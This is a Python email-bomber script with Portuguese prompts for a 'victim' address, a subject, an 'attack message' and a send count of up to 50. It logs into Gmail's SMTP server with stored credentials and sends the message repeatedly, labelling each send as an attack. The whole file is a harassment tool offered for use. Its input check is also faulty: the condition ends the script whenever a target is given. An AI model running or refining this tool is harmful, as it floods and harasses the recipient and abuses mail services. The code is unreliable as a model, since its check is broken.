#!/bin/python

import os, sys, smtplib, getpass, config, ctypes, base64

W = '\033[0m'  
R = '\033[31m' 
G = '\033[32m' 
ENDC = '\033[0m'

logo = R+r"""
.--.
|__| .-------.
|=.| |.-----.|
|--| || NUK ||
|  | |'-----'|
|__|~')_____('
   @wh0001s
"""+ENDC

os.system("cls || clear")

""" 
Variaveis 
"""

smtp_server= 'smtp.gmail.com'
port = 587
email_user = config.EMAIL
passwd = config.SENHA
print(logo)
target = input("Vítima: ")
subject = input("Título: ")
body = input("Mensagem do ataque: ")
qntd = input("Quantidade de envios: ")
int_qntd = int(qntd)

if int_qntd > 50 or int_qntd <= 0:
    print("Escolha entre 1 e 50.")
    exit(0)

if target or subject or body == "":
    print("Você não informou algo.")
    exit(0)

server = smtplib.SMTP(smtp_server,port)
server.ehlo()
server.starttls()
server.login(email_user,passwd)

for i in range(1, int_qntd+1):
    msg = 'From: ' + email_user + '\nSubject: ' + subject + '\n' + body
    server.sendmail(email_user,target,msg)
    print(G + "\r[ATTACK INFO] {}".format(i))
   
    sys.stdout.flush()
    
server.quit()
print( R + "\n\nAll {} sent".format(i) + W)
